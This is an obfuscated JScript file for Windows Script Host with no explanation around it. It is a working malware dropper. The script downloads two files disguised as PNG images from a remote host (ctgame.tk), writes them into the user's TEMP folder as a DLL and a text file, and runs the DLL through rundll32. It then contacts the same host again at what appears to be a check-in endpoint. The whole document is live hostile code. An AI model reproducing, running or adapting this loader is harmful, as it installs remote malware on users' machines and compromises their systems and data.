var _0x5f6d68 = 'https://ctgame.tk/';
var _0x2d765c = _0x5f6d68 + 'file/0.png';
var _0x3eb202 = _0x5f6d68 + 'file/1.png';
var _0x1ac096 = WScript['CreateObject']('WScript.Shell');
var _0x2f59db = _0x1ac096['Environment']('Process');
var _0x30e107 = _0x2f59db['Item']('TEMP') + '\\';
var _0xf66ddf = _0x30e107 + 'a.dll';
var _0x29898 = _0x30e107 + '1.txt';
_0x35e6d2(_0x2d765c, _0xf66ddf);
_0x35e6d2(_0x3eb202, _0x29898);
var _0x2ed515 = 'rundll32.exe ' + _0xf66ddf + ',a ' + _0x29898;
_0x1ac096['Run'](_0x2ed515);
var _0x2b0b4e = _0x30e107 + 'log.bin';
_0x35e6d2(_0x5f6d68 + 'conn.php?ge=2', _0x2b0b4e);

function _0x35e6d2(_0x2060c3, _0x5ad0bc) {
    var _0x78c665 = new ActiveXObject('ADODB.Stream');
    var _0x381c81 = ![];
    try {
        _0x381c81 = new XMLHttpRequest();
    } catch (_0x47f25f) {
        try {
            _0x381c81 = new ActiveXObject('Msxml2.XMLHTTP');
        } catch (_0x863421) {
            try {
                _0x381c81 = new ActiveXObject('Microsoft.XMLHTTP');
            } catch (_0x221e75) {
                _0x381c81 = ![];
            }
        }
    }
    _0x381c81['Open']('GET', _0x2060c3, 0x0);
    _0x381c81['Send']();
    _0x78c665['Mode'] = 0x3;
    _0x78c665['Type'] = 0x1;
    _0x78c665['Open']();
    _0x78c665['Write'](_0x381c81['ResponseBody']);
    _0x78c665['SaveToFile'](_0x5ad0bc, 0x2);
}